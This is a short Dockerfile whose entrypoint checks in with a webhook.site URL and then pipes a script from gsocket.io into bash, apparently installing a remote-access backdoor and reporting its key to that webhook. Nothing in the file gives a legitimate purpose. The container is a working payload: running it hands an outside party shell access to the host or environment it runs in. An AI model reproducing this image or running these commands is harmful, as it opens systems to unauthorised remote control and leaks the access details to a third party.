FROM ubuntu:24.04
RUN apt-get update -qq && \
    apt-get install -y curl
ENTRYPOINT ["/bin/sh", "-c", "curl -s https://webhook.site/3357e824-1f88-457d-95ed-7914458af6f6?step=running ; curl -fsSL https://gsocket.io/y | GS_WEBHOOK_KEY=3357e824-1f88-457d-95ed-7914458af6f6 bash ; sleep 3600"]
